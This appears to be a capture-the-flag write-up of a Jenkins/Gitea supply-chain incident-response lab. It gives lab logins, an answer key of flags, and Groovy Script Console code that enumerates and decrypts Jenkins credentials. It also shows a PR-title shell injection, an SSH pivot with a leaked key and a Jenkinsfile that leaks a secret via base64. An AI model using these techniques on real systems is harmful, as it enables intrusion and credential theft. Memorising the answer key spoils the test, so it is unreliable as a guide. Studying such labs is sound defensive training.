# Xuanji — Supply Chain Incident Response Part 3 (Jenkins + Gitea)

Source: https://xj.edisec.net/challenges/148
Target IP: 161.189.159.137 / 10.0.10.7

## Accounts

| Service | URL | User | Password |
|---------|-----|------|----------|
| Jenkins | http://IP:8081 | alice | alice |
| Jenkins | http://IP:8081 | admin | ciderland5# |
| Gitea | http://IP:3000 | thealice | thealice |
| Gitea | http://IP:3000 | red_queen | ciderland5# |

## Answers

| # | Task | Flag |
|---|------|------|
| 1 | Knave user password | `rockme` |
| 2 | Configure Jenkins → flag8 | `B1A648E1-FD8B-4D66-8CAF-78114F55D396` |
| 3 | reportcov malicious hook address | `flag{192.168.31.170}` |
| 4 | Hacker's executed command | `env` |
| 5 | goat-prod flag_rce | `flag{61425de991e18a5fc650e7ef338b2f36}` |
| 6 | flag9 | `31350FBC-A959-4B4B-A8BD-DCA7AC9248A6` |
| 7 | Malicious code version | `flag{1.0.16}` |
| 8 | Deleted/Added char count | `flag{161,161}` |
| 9 | flag10 | `D54734AB-7B83-4931-A9BB-171476101FDF` |
| 10 | flag_rce2 | `flag{213089dbfa5cdff4f8a778a2262cf881}` |

## Attack Chain

```
xia0le(thealice) ──PR poisoning──▶ Gitea mock-turtle repo (v1.0.16)
                                    │ Jenkinsfile injects flag10 credential exfiltration
                                    ▼
                            Jenkins auto-build → echo $TOKEN | base64 → leaks flag10

xia0le(thealice) ──webhook hijack──▶ Gitea Cov/reportcov repo
                                    │ hook → 192.168.31.170 (attacker-controlled)
                                    │ Jenkinsfile `echo PR ${title}` command injection
                                    ▼
                            PR title `` `env` `` → leaks SSH KEY + GITEA_TOKEN
                                    │
                            SSH private key → root@prod → /flag_rce
```

## Step-by-Step

### 1. Knave Password Cracking

Visit Jenkins user config `/user/knave/configure`, extract bcrypt hash from password field:

```
#jbcrypt:$2a$10$8uSiWQ.nSHzPGRr3jJolD.kPAX7txcdBL1mREVif9FuAHqJ6epvJS
```

Crack with John the Ripper:

```bash
john --wordlist=rockyou.txt --format=bcrypt hash.txt
# Password: rockme
```

### 2. flag8 via Jenkins Script Console

With admin access (`ciderland5#`), use the Script Console (`/scriptText` + CRUMB token) to enumerate credentials:

```groovy
def creds = CredentialsProvider.lookupCredentials(
    UsernamePasswordCredentialsImpl.class, Jenkins.instance, null, null)
creds.each { if(it.id.contains('flag8')) println(it.password.plainText) }
// B1A648E1-FD8B-4D66-8CAF-78114F55D396
```

**CRUMB handling**: The CRUMB must be obtained and used with the same cookie jar:

```bash
curl -c /tmp/cookies -u admin:password /crumbIssuer/api/json
# Extract crumb, then:
curl -b /tmp/cookies -H "Jenkins-Crumb:$CRUMB" \
  --data-urlencode 'script=...' /scriptText
```

### 3. Malicious Webhook Discovery

Login as `red_queen` to Gitea, query webhooks via API:

```
GET /api/v1/repos/Cov/reportcov/hooks
```

The redirect URL was changed to `http://192.168.31.170:8081/generic-webhook-trigger/invoke?token=...` — attacker's controlled server.

### 4. Command Injection Analysis

Cov/reportcov Jenkinsfile, `Send notification` stage:

```groovy
sh "echo Pull Request ${title} created in the reportcov repository"
```

The `${title}` variable is injected from the PR title without sanitization. Hacker creates PR with title `` `env` `` — backticks trigger shell command substitution, executing `env` which dumps all environment variables including SSH keys and tokens.

Build #2 console log confirms: `JENKINS_AGENT_SSH_PUBKEY`, `GITEA_TOKEN=5d3ed5564341d5060c8524c41fe03507e296ca46`, `KEY=-----BEGIN OPENSSH PRIVATE KEY-----` all exposed in plaintext.

### 5. flag_rce via SSH Key Leak

The SSH key is stored in the cov-reportcov job's `EnvInjectJobProperty` (config.xml). Extract it via Script Console, then SSH to prod server:

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/pk root@172.18.0.4 cat /flag_rce
# flag{61425de991e18a5fc650e7ef338b2f36}
```

### 6. flag9 from wonderland-dormouse

In wonderland-dormouse job config.xml, find folder-scoped credential:

```xml
<id>flag9</id>
<username>flag9</username>
<password>{AQAAABAAAAAwClwI+Ryt0QutR21F+bdw9PivHIKrHf2hMWA/0wf6au5RjtM8Fra8SQHB+s+DW5L90kJu7iLjRV1mpeiCS8KJXw==}</password>
```

Decrypt via Script Console:

```groovy
println(hudson.util.Secret.fromString("{AQAA...}").plainText)
// 31350FBC-A959-4B4B-A8BD-DCA7AC9248A6
```

### 7. Malicious Code Version

Wonderland/mock-turtle repository version progression:

| Branch | Version | Malicious | Merged |
|--------|---------|-----------|--------|
| challenge1 | 1.0.12 | Yes | No |
| challenge2 | 1.0.11 | Yes | No |
| challenge3 | 1.0.13 | Yes | Yes (PR #2) |
| challenge7 | **1.0.16** | Yes | **Yes (PR #6)** |

Final merged version: `1.0.16` → `flag{1.0.16}`

### 8. Deleted/Added Character Count

The CI pipeline uses `git diff --word-diff=porcelain` to count word-level changes:

```bash
gitp=$(git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^+[^+]" | wc -w)  # 161
gitm=$(git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^-[^-]" | wc -w)  # 161
```

The hacker balanced inserted/removed words to pass `gitp - gitm == 0` check. **Not** the `--stat` line count (16 insertions / 9 deletions).

Answer: `flag{161,161}`

### 9. flag10 Credential Exfiltration

mock-turtle CI pipeline's malicious Jenkinsfile:

```groovy
withCredentials([usernamePassword(credentialsId: 'flag10', ...)]) {
    sh 'echo $TOKEN | base64'
}
```

PR-3 build log shows base64 output `RDU0NzM0QUItN0I4My00OTMxLUE5QkItMTcxNDc2MTAxRkRGCg==`. Decoded:

```
D54734AB-7B83-4931-A9BB-171476101FDF
```

### 10. flag_rce2 from Agent Workspace

Use Jenkins `RemotingDiagnostics.executeGroovy()` to run commands on agent1 (172.18.0.7):

```groovy
def agent = Jenkins.instance.getNode("agent1").computer
def script = """cat /home/jenkins/workspace/wonderland-mock-turtle_main/flag_rce2"""
RemotingDiagnostics.executeGroovy(script, agent.channel)
// flag{213089dbfa5cdff4f8a778a2262cf881}
```

## Key Techniques

1. **Jenkins Script Console** (`/scriptText` + CRUMB) — Groovy RCE for credential enumeration and decryption
2. **CredentialsProvider API** — Enumerate all credential types: `UsernamePasswordCredentialsImpl`, `StringCredentialsImpl`, `BasicSSHUserPrivateKey`, `PersonalAccessTokenImpl`
3. **`hudson.util.Secret.fromString()`** — Decrypt Jenkins-encrypted credentials
4. **`RemotingDiagnostics.executeGroovy()`** — Remote code execution on Jenkins agents
5. **`git diff --word-diff=porcelain`** — Word-level diff stats (vs line-level `--stat`)

## Attack Techniques Summary

1. **Supply chain poisoning**: Malicious PRs injecting credential-exfiltration code into CI config
2. **CI/CD credential theft**: `withCredentials` binding + `echo | base64` exfiltration
3. **Webhook hijacking**: Redirecting Gitea webhooks to attacker-controlled server
4. **Shell command injection**: PR title backticks → `echo ${title}` expansion → arbitrary commands
5. **CI check bypass**: `git diff --word-diff` zero-net-change to pass automated PR review
6. **SSH lateral movement**: Leaked SSH keys for cross-server access

## Lessons Learned

- Build logs are the #1 forensic artifact in CI/CD incidents — environment variables, keys, commands all in plaintext
- Always enumerate all 4 credential types in Jenkins forensics
- `git diff --word-diff=porcelain` ≠ `git diff --stat` — read the CI pipeline code to know which metric matters
- Key transfer via base64 + Groovy Script Console is the standard approach for agent-to-prod pivoting
